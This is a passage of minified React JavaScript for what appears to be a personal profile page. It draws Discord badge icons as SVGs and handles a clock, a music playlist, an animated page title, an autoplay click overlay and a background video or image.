0-.78176.34822-.78176.76615 0 .41794.35541.76611.78176.76611h3.62404c.42635 0 .78159.3484.78159.7664 0 .4179-.35524.7661-.78159.7661h-2.27402c-.42636 0-.7816.3482-.7816.7662 0 .4179.35524.7663.7816.7663h1.56336c.07112.8359.2843 1.6717.63954 2.4379 1.77654 3.8311 6.46643 5.5028 10.37463 3.7614zm-7.2725-5.1884c-1.0318-2.2025-.0466-4.80794 2.2003-5.81933 2.2469-1.0114 4.9049-.04564 5.9366 2.15683 1.0318 2.2025.0468 4.8079-2.2003 5.8193-2.2469 1.0114-4.9048.0457-5.9366-2.1568z", fill: "#4f5d7f", fillRule: "evenodd" }), (0, c.jsx)("path", { d: "m16.8142 9.86662 1.4212 2.36838c.0711.1392.0711.2089 0 .3482l-1.4212 2.3683c-.0711.1393-.2131.1393-.2842.1393h-2.7714c-.142 0-.2131-.0697-.2841-.1393l-1.4213-2.3683c-.0709-.1393-.0709-.209 0-.3482l1.4213-2.36838c.071-.13926.2132-.13926.2841-.13926h2.7714c.1422-.06971.2131 0 .2842.13926z", fill: "#c5cedd" })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Early Supporter":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("path", { d: "m16.4823 15.6364h-1.2218c-.7028-.0096-1.3731-.2975-1.8639-.8006s-.7621-1.1803-.7543-1.8831v-1.2509c-.0019-.2803.1071-.5501.3033-.7504s.4636-.3148.744-.3187h5.7382v-1.49815h-10.18186c-.92363 2.08005-1.86909 4.24725-2.18181 5.09095-.20109.4955-.54642.9193-.99121 1.2162-.44479.297-.96854.4535-1.50334.4492v.8946c.40174.4023.87908.7212 1.40455.9384s1.08869.3283 1.65727.327h9.1564c.7008 0 1.373-.2779 1.8693-.7728s.776-1.1663.7779-1.8672v-.1891c-.4132.2695-.8957.4135-1.3891.4146zm-6.1309-2.0437c-.1802.0013-.35663-.0514-.50658-.1513-.14996-.0999-.26654-.2424-.33472-.4092-.06819-.1668-.08484-.3502-.04782-.5265.03702-.1764.12602-.3376.25552-.4629s.2936-.2089.471-.2401c.1775-.0312.3603-.0084.5247.0652.1644.0737.3031.1949.398.3481.0949.1531.1417.3312.1344.5113-.0093.2315-.1074.4506-.274.6118-.1665.1611-.3888.252-.6205.2536z", fill: "#9cb8ff" }), (0, c.jsx)("path", { d: "m19.617 10.6327h-5.92c-.1394.001-.2773.0294-.4057.0836-.1285.0543-.245.1333-.343.2326-.0979.0992-.1753.2168-.2278.346-.0524.1292-.079.2675-.078.4069v1.2509c-.0078.7028.2635 1.38.7543 1.8831s1.1611.791 1.8639.8006h2.7854c.4934-.0011.9759-.1451 1.3891-.4146l.0728-.0436c.3531-.2533.6404-.5876.8378-.9748s.2991-.8161.2967-1.2507v-1.2509c.0039-.2772-.1015-.5448-.2934-.7449s-.4549-.3166-.7321-.3242zm-2.6109 3.8327h-1.1563c-.0626.0081-.1261.0027-.1864-.0157s-.1159-.0495-.1633-.0911c-.0473-.0416-.0853-.0929-.1112-.1503-.026-.0575-.0395-.1198-.0395-.1829 0-.063.0135-.1253.0395-.1828.0259-.0574.0639-.1087.1112-.1503.0474-.0416.103-.0727.1633-.0911s.1238-.0238.1864-.0158h1.1563c.0626-.008.1261-.0026.1864.0158s.1159.0495.1633.0911c.0473.0416.0853.0929.1112.1503.026.0575.0395.1198.0395.1828 0 .0631-.0135.1254-.0395.1829-.0259.0574-.0639.1087-.1112.1503-.0474.0416-.103.0727-.1633.0911s-.1238.0238-.1864.0157zm2.0728 0h-.4437c-.1069-.0137-.2052-.066-.2764-.147s-.1105-.1851-.1105-.293c0-.1078.0393-.2119.1105-.2929s.1695-.1333.2764-.1471h.4437c.0625-.008.126-.0026.1863.0158s.116.0495.1633.0911c.0474.0416.0853.0929.1113.1503.0259.0575.0394.1198.0394.1828 0 .0631-.0135.1254-.0394.1829-.026.0574-.0639.1087-.1113.1503-.0473.0416-.103.0727-.1633.0911s-.1238.0238-.1863.0157z", fill: "#cbdaf7" }), (0, c.jsx)("path", { d: "m17.0061 13.5855h-1.1564c-.0625-.0081-.1261-.0027-.1864.0157s-.1159.0495-.1633.0911c-.0473.0417-.0852.0929-.1112.1503-.026.0575-.0394.1198-.0394.1829 0 .063.0134.1253.0394.1828.026.0574.0639.1087.1112.1503.0474.0416.103.0727.1633.0911s.1239.0238.1864.0158h1.1564c.0625.008.126.0026.1863-.0158s.116-.0495.1633-.0911c.0474-.0416.0853-.0929.1113-.1503.0259-.0575.0394-.1198.0394-.1828 0-.0631-.0135-.1254-.0394-.1829-.026-.0574-.0639-.1086-.1113-.1503-.0473-.0416-.103-.0727-.1633-.0911s-.1238-.0238-.1863-.0157zm2.0581 0h-.4436c-.107.0137-.2052.066-.2765.147-.0712.081-.1105.1851-.1105.293 0 .1078.0393.2119.1105.2929.0713.081.1695.1333.2765.1471h.4436c.0626.008.1261.0026.1864-.0158s.1159-.0495.1633-.0911c.0473-.0416.0853-.0929.1112-.1503.026-.0575.0395-.1198.0395-.1828 0-.0631-.0135-.1254-.0395-.1829-.0259-.0574-.0639-.1086-.1112-.1503-.0474-.0416-.103-.0727-.1633-.0911s-.1238-.0238-.1864-.0157z", fill: "#9cb8ff" }), (0, c.jsx)("path", { d: "m2.62786 15.1709c-.10957-.05-.21639-.1058-.32-.1673v4.2037l1.13455.7927 1.12727-.7927v-3.3164c-.71689.0255-1.41481-.2333-1.94182-.72z", fill: "#ff903e" }), (0, c.jsx)("path", { d: "m6.3152 13.7455c-.1373.345-.34381.6583-.6068.9205-.26298.2622-.57687.4677-.92232.604-.34546.1363-.71516.2004-1.08632.1883-.37117-.012-.73594-.0999-1.07183-.2583.52585.4893 1.22391.7508 1.94182.7273.53666-.0108 1.05762-.1831 1.49485-.4945s.77041-.7473.95606-1.251c.32727-.8291 1.27272-2.9963 2.18182-5.09089h-.92364s-1.25818 2.85819-1.96364 4.65459z", fill: "#d0d9ea" }), (0, c.jsx)("path", { d: "m11.5298 4 .6182.05091z", fill: "#ebeff7" }), (0, c.jsx)("path", { d: "m16.897 7.11273c.8756.02248 1.7483.11 2.6109.26182-.5673-.67636-2.7782-2.90909-7.3527-3.30909 3.309.79273 4.5309 2.67636 4.7418 3.04727zm-10.58184 6.63277c.70545-1.7964 1.96363-4.61095 1.96363-4.61095s2.24001-1.69454 6.85091-1.98545c-1.6073-2.18182-4.2473-2.90909-5.87636-3.08364-5.62182.60364-8.24727 4.87273-8.24727 8.27634-.033091.5186.06957 1.0368.29786 1.5036s.57432.866 1.00396 1.1582c.1036.0615.21042.1173.32.1673.33408.1592.69713.2485 1.06693.2625.36979.014.73856-.0476 1.08372-.181.34517-.1335.65948-.3359.92369-.595.26422-.2591.47278-.5694.61293-.9119zm-4.74909-2.0655c.02458-.5434.26177-1.0553.66042-1.4254.39864-.37006.92678-.5686 1.47049-.55278.53236.11535.99792.43568 1.29598.89158s.40466 1.0109.29674 1.5448c-.02451.5382-.25765 1.0458-.65 1.415-.39235.3693-.91308.5713-1.45181.5632-.26672-.053-.52036-.1581-.74635-.3094-.22599-.1512-.41989-.3456-.57057-.572-.15069-.2263-.25519-.4802-.30751-.7471-.05232-.2668-.05144-.5414.00261-.8079z", fill: "#fff" }), (0, c.jsx)("path", { d: "m16.1552 7.10544c-.3564 0-.7273 0-1.0328.04363-4.6109.29091-6.84359 1.98546-6.84359 1.98546h15.60729c-1.29-.93245-2.7877-1.53654-4.3637-1.76-.8626-.15183-1.7353-.23934-2.6109-.26182z", fill: "#7687b2" }), (0, c.jsx)("path", { d: "m3.18792 14.1164c.54495.0178 1.07495-.1799 1.47517-.5502.40023-.3703.63843-.8833.66301-1.428.10697-.5391-.00456-1.0986-.31006-1.5555s-.77995-.77374-1.31903-.88086c-.5437-.01583-1.07184.18271-1.47049.55276-.39864.3701-.63583.882-.66042 1.4254-.05404.2665-.05493.5411-.0026.8079.05232.2669.15682.5208.30751.7471.15068.2264.34458.4208.57057.572.22599.1513.47962.2564.74634.3094zm-1.28-2.3564c.00742-.1825.05112-.3617.12857-.5271s.18709-.3137.32251-.4363c.13542-.1225.29391-.2168.4662-.2775.1723-.0606.35494-.0862.53727-.0754.35402.0768.6634.2902.86088.5939.19747.3037.26707.6731.19366 1.0279-.01513.3614-.17287.7021-.43868.9475-.26581.2453-.61802.3753-.9795.3616-.35825-.0704-.67407-.2798-.87847-.5823-.20441-.3025-.28078-.6736-.21244-1.0323z", fill: "#7687b2" }), (0, c.jsx)("path", { d: "m2.96248 13.3745c.36148.0138.71369-.1162.9795-.3616.2658-.2453.42355-.586.43868-.9474.0734-.3548.0038-.7242-.19367-1.0279-.19748-.3037-.50686-.5171-.86088-.594-.36217-.0118-.71436.1199-.97995.3664s-.42308.588-.43823.95c-.06934.3535.00209.7201.19907 1.0216.19698.3016.50394.5144.85548.5929zm12.16002-6.21814h1.7527c-.2182-.37818-1.4545-2.25454-4.7345-3.04727l-.611-.10909h-.9163c-.4521.0002-.90378.02691-1.35274.08 1.62184.19636 4.25454.86545 5.86184 3.07636z", fill: "#ff903e" }), (0, c.jsx)("circle", { cx: "10.28", cy: "12.75", fill: "#040405", r: "1" })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Early Verified Bot Developer":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { d: "m21.58 11.4-4.28-7.39-.35-.6h-9.91l-.35.6-4.27 7.39-.35.6.35.6 4.27 7.39.35.6h9.92l.35-.6 4.28-7.39.35-.6zm-13.07-1.03-1.63 1.63 1.63 1.63v2.73l-4.36-4.36 4.37-4.37v2.74zm3.12 6.93-2.04-.63 3.1-9.98 2.04.64zm3.86-.93v-2.73l1.63-1.64-1.63-1.63v-2.74l4.36 4.37z", fill: "#3e70dd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Discord Bug Hunter_1":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("path", { d: "m16.5822 2.63812s7.6721 5.23623 4.7567 12.58868c-2.9154 7.3525-8.7142 5.313-6.5469 3.1648 2.1674-2.1482-2.5573-3.6059-5.58143-6.3935l7.36523-9.35998", fill: "#3ba55c" }), (0, c.jsx)("path", { d: "m16.1155 9.83717c-1.6175 2.05873-3.9 3.08803-5.6646 2.71723l-6.15684 7.8447c-.10362.1324-.23231.243-.37871.3256-.1464.0825-.30764.1354-.47451.1556-.16686.0202-.33606.0073-.49793-.038-.16187-.0452-.31322-.122-.44541-.2258-.13374-.1032-.2457-.2319-.32942-.3786s-.13754-.3086-.15834-.4762c-.02081-.1677-.00819-.3378.03712-.5005s.12242-.3149.22687-.4476l6.12492-7.832c-.81197-1.62394-.36443-4.11099 1.27869-6.18886 2.03946-2.58295 5.11476-3.54836 6.89856-2.15459 1.7837 1.39377 1.5664 4.61607-.4604 7.19902z", fill: "#b4e1cd" })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t.split("_")[0] }) }) })] });
              case "Discord Bug Hunter_2":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", xmlnsXlink: "http://www.w3.org/1999/xlink", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("mask", { id: "a", height: "19", maskUnits: "userSpaceOnUse", width: "16", x: "2", y: "2", children: (0, c.jsx)("path", { d: "m16.1438 9.84735c-1.6048 2.04975-3.9088 3.08265-5.7044 2.70125l-6.14926 7.8813c-.44491.572-1.22351.6356-1.79554.1907-.57203-.445-.63558-1.2235-.25423-1.7956l6.1493-7.8177c-.82626-1.60486-.38135-4.09954 1.28707-6.21286 2.04976-2.57413 5.11646-3.52751 6.91196-2.19278 1.7956 1.33473 1.5413 4.6239-.4449 7.24569z", fill: "#ffd56c" }) }), (0, c.jsx)("path", { d: "m16.5888 2.60168s7.6906 5.25949 4.7351 12.63232c-2.9555 7.3728-8.7235 5.323-6.5307 3.1461s-2.5582-3.591-5.57726-6.4194z", fill: "#ffeac0" }), (0, c.jsx)("path", { d: "m16.1438 9.84735c-1.6048 2.04975-3.9088 3.08265-5.7044 2.70125l-6.14926 7.8813c-.44491.572-1.22351.6356-1.79554.1907-.57203-.445-.63558-1.2235-.25423-1.7956l6.1493-7.8177c-.82626-1.60486-.38135-4.09954 1.28707-6.21286 2.04976-2.57413 5.11646-3.52751 6.91196-2.19278 1.7956 1.33473 1.5413 4.6239-.4449 7.24569z", fill: "#ffd56c" }), (0, c.jsxs)("g", { fill: "#fff", mask: "url(#a)", children: [(0, c.jsx)("path", { d: "m13.0389-1.26782.7405.09754-3.1567 23.96118-.74043-.0976z" }), (0, c.jsx)("path", { d: "m14.2822-1.51801 1.6226.21377-3.1566 23.96114-1.6226-.2137z" })] })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t.split("_")[0] }) }) })] });
              case "Discord Certified Moderator":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { d: "m17.2719 3h-9.54383c-.14912 1.9386-1.78947 3.42982-3.72807 3.42982v.89474c0 4.39914 2.08772 8.50004 5.74123 11.40794l2.75877 2.1622 2.7588-2.1622c3.6535-2.8334 5.7412-7.0088 5.7412-11.40794v-.89474c-1.9386 0-3.5044-1.49122-3.7281-3.42982zm-6.4868 12.8991c-2.23685-1.7895-3.57896-4.3245-3.57896-7.08331v-.52193c1.19298 0 2.23684-.89474 2.3114-2.08772h2.98246v11.10966z", fill: "#5865f2" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Discord Staff":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsxs)("g", { fill: "#5865f2", children: [(0, c.jsx)("path", { d: "m5.92127 6.03526s.22115-.33086.31286-.47743c.09172-.14657-.23743-.49286-.36514-.60257-.12772-.10971-.32914-.05486-.32914-.05486-1.60715.71229-2.41115 2.17372-2.52086 2.466-.10972.29229.27943.61115.56657.76715.132.072.342-.08743.47143-.20572l.04371-.04457.06772-.06857.00085-.00086 4.37229 4.35517.59743-.5975 1.09801-1.098-4.32173-4.43224z" }), (0, c.jsx)("path", { d: "m16.2505 10.6294.2306-.2194 2.0717 2.052c.0146.0129.03.018.0437.018.0395 0 .072-.036.072-.036s2.2937-2.2757 2.3015-2.2834c.0677-.0669 0-.1037 0-.1037l-1.7692-1.78119-.0026.00258-.2425-.23743.1354-.13029.2897.03343-.0548-.384.0728-.07371-.1088-.55372c-.378-.53571-1.4135-1.39371-1.4135-1.39371l-.5417-.09772-.0548.07286-.408-.06086.0394.348.0257.02572-.1209.12171-.6685-.654s-3.8795-2.10686-4.086-2.20457c-.1166-.054-.2023-.09-.2846-.09-.0634 0-.1251.02143-.1963.072-.1646.11571-.0677.34886-.0677.34886l2.412 4.45714.4826.47829-.1509.15085-.0557.05572-.3857-.05315.0591.38229-.1114.11143-.0197-.01972c-.018-.018-.0429-.02742-.0669-.02742s-.048.00942-.0668.02742c-.0369.03686-.0369.09686 0 .13372l.0197.01971-.0532.054-.0137-.01457c-.0188-.018-.0428-.02743-.0668-.02743-.0249 0-.0489.00943-.0669.02743-.0368.03686-.0368.09686 0 .13372l.0146.01457-1.0149 1.02004-.0231-.0232c-.0189-.018-.0429-.0274-.0669-.0274s-.048.0094-.0668.0274c-.0369.0369-.0369.0969 0 .1337l.024.0232-.054.054-.018-.0172c-.018-.0188-.0429-.0283-.066-.0283-.0249 0-.0489.0095-.0677.0283-.036.0369-.036.096 0 .1329l.018.018-.132.1337-.018.1697.0694.0712-.0017.0008-.084.0857-5.47632 5.4755-.07114-.0592-.22714.0326-.12858.1303-.00857-.0086c-.01885-.0189-.04285-.0283-.06685-.0283s-.04886.0094-.06686.0283c-.03686.0369-.03686.096 0 .1329l.01028.0102-.05314.0549-.00514-.0051c-.018-.0189-.04286-.0283-.06686-.0283s-.048.0094-.06686.0283c-.036.0368-.036.096 0 .1328l.006.0069-1.002 1.0191-.02057-.0206c-.01885-.0188-.042-.0274-.06685-.0274-.024 0-.048.0086-.06686.0274-.03686.0369-.03686.0969 0 .1338l.02228.0214-.05314.054-.01628-.0163c-.01886-.018-.04286-.0274-.06772-.0274-.02314 0-.048.0094-.066.0274-.03686.0369-.03686.0969 0 .1337l.01714.018-.07457.0763-.38828-.0694.02914.4337-.12257.1251.10628.5846s.16286.5091.498.8469c.32486.3274.82029.4842.84172.5005l.55971.0977.138-.1354.38572.0626-.06343-.3814.11743-.1149.054.054c.018.018.042.0274.066.0274s.04885-.0094.06685-.0274c.03686-.0377.03686-.0969 0-.1337l-.05314-.0532.05486-.0531.04628.0463c.018.0188.04286.0283.06686.0283s.048-.0095.06686-.0283c.03686-.0369.03686-.096 0-.1329l-.04543-.0463 1.01743-1.0037.04457.0446c.018.0189.04286.0274.06686.0274s.048-.0085.06685-.0274c.036-.0369.036-.0969 0-.1337l-.04371-.0429.054-.054.03771.0377c.018.018.042.0275.066.0275.02486 0 .04886-.0095.06686-.0275.03686-.0368.03686-.0968 0-.1337l-.03686-.0368.114-.1115.04115-.2442-.06086-.0609.00086-.0009.11057-.1097 5.43946-5.4411-.0026-.0052.1063.1098.1706-.0189.1534-.1543.0248.0249c.0189.018.0429.0274.0669.0274s.0489-.0094.0669-.0274c.0368-.0369.0368-.0969 0-.1337l-.0249-.0249.054-.0531.0189.0188c.018.018.042.0274.0668.0274.024 0 .048-.0094.066-.0274.0369-.0368.0369-.0968 0-.1337l-.0188-.0197 1.0165-1.0183.0266.0266c.018.018.042.0274.066.0274.0249 0 .0489-.0094.0669-.0274.0368-.0369.0368-.0969 0-.1337l-.0266-.0266.054-.054.0206.0214c.0188.018.0428.0274.0668.0274s.048-.0094.0669-.0274c.0368-.0377.0368-.0968 0-.1337l-.0206-.0214.1131-.1132.378.0592z" }), (0, c.jsx)("path", { d: "m17.0057 16.7793-2.4111-1.8274-.4294-.4423-1.6637 1.6637.4183.3995 1.5711 2.3562 2.1188 2.3203 2.4421-2.2783z" })] }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Events":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsxs)("g", { fill: "#fbb848", children: [(0, c.jsx)("path", { d: "m21.5912 6.84349-7.8694 5.16551c-.1351.088-.2444.2103-.317.3543l-1.1997 2.4056c-.0174.0399-.0461.0739-.0825.0977-.0364.0239-.079.0366-.1226.0366s-.0862-.0127-.1226-.0366c-.0364-.0238-.0651-.0578-.0825-.0977l-1.1997-2.4056c-.0726-.144-.1819-.2663-.317-.3543l-7.86944-5.16551c-.03957-.04698-.09618-.07632-.15738-.08157-.0612-.00524-.12198.01404-.16896.0536-.04698.03957-.07633.09618-.08157.15738-.00525.0612.01403.12198.0536.16896l3.28825 6.39624c.01598.0335.02385.0703.02297.1074s-.01049.0734-.02804.1061c-.01756.0327-.04257.0608-.07301.082-.03043.0212-.06544.035-.10219.0402h-1.97668c-.04881-.0005-.0965.0146-.13617.043-.03967.0285-.06926.0688-.08449.1152s-.0153.0964-.00022.1428c.01509.0464.04455.0869.08413.1154l8.8142 6.3155c.0403.0275.088.0422.1368.0422s.0965-.0147.1368-.0422l8.8142-6.3155c.0396-.0285.069-.069.0841-.1154s.015-.0964-.0002-.1428-.0448-.0867-.0845-.1152c-.0396-.0284-.0873-.0435-.1362-.043h-1.9766c-.0389-.0015-.0769-.0126-.1105-.0323-.0335-.0197-.0617-.0474-.082-.0806s-.0321-.071-.0343-.1098c-.0022-.0389.0052-.0777.0216-.113l3.3132-6.39624c.0395-.04698.0588-.10776.0536-.16896-.0053-.0612-.0346-.11781-.0816-.15738-.047-.03956-.1078-.05884-.169-.0536-.0612.00525-.1178.03459-.1574.08157z" }), (0, c.jsx)("path", { d: "m12.1741 2.10696.8081 1.64723c.0143.02721.0346.05084.0594.06913.0247.01829.0533.03078.0835.03654l1.8213.26107c.0356.00524.0691.02036.0966.04366s.0479.05383.0589.08814.0122.07102.0034.10595c-.0089.03494-.0273.06671-.0532.0917l-1.3178 1.28049c-.0213.02203-.0373.04854-.047.07758s-.0127.05988-.009.09025l.3108 1.80885c.0069.03487.0036.07096-.0094.10404-.013.03307-.0351.06174-.0639.08264-.0287.0209-.0628.03315-.0983.03532-.0354.00217-.0708-.00584-.1019-.02309l-1.6285-.85159c-.0265-.01527-.0565-.02331-.0871-.02331-.0305 0-.0605.00804-.087.02331l-1.6286.85159c-.031.01725-.0664.02526-.1019.02309-.0354-.00217-.0695-.01442-.0983-.03532-.0287-.0209-.0509-.04957-.0639-.08264-.0129-.03308-.0162-.06917-.0094-.10404l.3108-1.80885c.0038-.03037.0008-.06121-.0089-.09025s-.0258-.05555-.047-.07758l-1.31781-1.28049c-.02595-.02499-.04438-.05676-.05318-.0917-.00881-.03493-.00764-.07164.00336-.10595s.03141-.06484.05889-.08814c.02749-.0233.06095-.03842.0966-.04366l1.82124-.25485c.0303-.00576.0588-.01825.0836-.03654.0247-.01829.045-.04192.0594-.06913l.8081-1.64723c.015-.03321.0392-.06147.0696-.08149.0305-.02003.066-.03101.1025-.03166.0364-.00065.0723.00905.1035.02798.0311.01893.0563.0463.0725.07895z" })] }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Partnered Server Owner":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsxs)("g", { fill: "#5865f2", children: [(0, c.jsx)("path", { d: "m16.6033 9.15179-2.4908 1.66051c-.249.2491-.6642.1661-.7472 0-.2491-.2491-.6642-.4151-.9133-.4982-.6642-.166-1.2454 0-1.7435.2491l-.83027.5812-4.64945 2.9889c-.99631.6642-2.2417.4152-2.9059-.6642-.66421-1.0793-.24908-2.2417.74723-2.8228l5.31365-3.65318c1.49447-.83026 3.23804-1.24539 4.89854-.83026 1.4114.24907 2.6568.99631 3.4871 2.15867.249.16605.249.66421-.1661.83026z" }), (0, c.jsx)("path", { d: "m22 11.6425c0 .7473-.4152 1.4115-.9963 1.7436l-5.4797 3.5701c-.9964.6642-2.2417.9963-3.4041.9963-.4982 0-.9963 0-1.4114-.166-1.41148-.2491-2.49081-1.1624-3.48712-2.1587-.16606-.1661-.16606-.6642.16605-.7473l2.49077-1.6605c.2491-.249.6642-.166.7472 0 .2491.2491.4982.4152.9133.4982.6642.166 1.2454 0 1.7436-.2491l1.2453-.7472 3.7362-2.4908.4982-.41513c.9963-.6642 2.2417-.41512 2.9059.66423.166.4151.3321.7472.3321 1.1623z" })] }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
            }
          });
        };
      function H(e) {
        var t = e.bio,
          s = e.musicIndex,
          l = {
            date: new Date(),
            currentMusicIndex: s,
            isMusicPlaying: !1,
            pageTitle: "",
          },
          r = (0, a.useState)(l),
          i = r[0],
          n = (i.date, i.currentMusicIndex),
          o = i.isMusicPlaying,
          d = i.pageTitle,
          h = r[1];
        setInterval(function () {
          h(function (e) {
            return Z({}, e, { date: new Date() });
          });
        }, 1e3);
        var u = function () {
            h(function (e) {
              return Z({}, e, {
                currentMusicIndex:
                  e.currentMusicIndex < t.songs.length - 1
                    ? e.currentMusicIndex + 1
                    : 0,
              });
            });
          },
          m = (0, a.useState)(!t.autoplayfix),
          f = m[0],
          p = m[1],
          j = 0,
          C = t.title,
          b = t.songs[n];
        (0, a.useEffect)(function () {
          t.animatedTitle
            ? (function e() {
                h(function (e) {
                  return Z({}, e, {
                    pageTitle:
                      C.substring(j, C.length) + " " + C.substring(0, j),
                  });
                }),
                  ++j > C.length && (j = 0),
                  setTimeout(function () {
                    return e();
                  }, 150);
              })()
            : t.animatedTitle ||
              h(function (e) {
                return Z({}, e, { pageTitle: t.title });
              });
        }, []);
        var z,
          y,
          N,
          M,
          L = new RegExp(/\s/).test(t.description),
          k = (0, a.useRef)(null),
          B = (0, a.useRef)(null);
        return (0, c.jsxs)(c.Fragment, {
          children: [
            (0, c.jsx)(g(), { children: (0, c.jsx)("title", { children: d }) }),
            t.autoplayfix &&
              (0, c.jsx)("div", {
                className: "".concat(
                  f
                    ? "animate-fadeOut hidden"
                    : "flex h-screen w-screen items-center justify-center hover:cursor-pointer"
                ),
                onClick: function () {
                  var e, t, s;
                  p(!0),
                    null ===
                      (t =
                        null === (e = k.current) || void 0 === e
                          ? void 0
                          : e.audio.current) ||
                      void 0 === t ||
                      t.play(),
                    null === (s = B.current) || void 0 === s || s.play();
                },
                children: "[ Click Anywhere ]",
              }),
            (0, c.jsxs)("div", {
              className: "flex flex-col justify-center ".concat(
                t.autoplayfix ? "".concat(f ? "animate-fadeIn" : "hidden") : ""
              ),
              children: [
                (0, c.jsx)("div", {
                  className:
                    "static flex h-[26vh] z-5 w-full rounded bg-darkM-700",
                  children:
                    "" !== t.background.url &&
                    (function (e) {
                      switch (e.background.type) {
                        case "video":
                          return (0, c.jsxs)("video", {
                            ref: B,
                            autoPlay: f,
                            draggable: !1,
                            loop: !0,
                            muted: !0,
                            playsInline: !0,
                            className: "object-cover w-full h-full",
                            children: [
                              (0, c.jsx)("source", {
                                src: e.background.url,
                                type: "video/mp4",
                              }),
                              "Your browser does not support the video tag.",
                            ],
                          });
                        case "image":
                          return (0, c.jsx)("img", {
                            className: "object-cover w-full h-full",
                            draggable: !1,
                            src: e.background.url,
                          });
                      }
                    })(t),
                }),
                (0, c.jsxs)("div", {
                  className:
                    "static mx-auto flex z-10 flex-col items-center gap-2 pb-12 md:w-auto w-screen",
                  children: [
                    (0, c.jsx)("div", {
                      className: "-mt-12 rounded-full border-4 border-darkGrey",
                      children: (0, c.jsx)("img", {
                        src: t.pfp.url,
                        alt: "",
                        className: "h-32 w-32 rounded-full",
                        draggable: !1,
                      }),
                    }),
                    (0, c.jsxs)("div", {
                      className: "flex flex-row items-center gap-1",
                      children: [
                        (0, c.jsxs)("svg", {
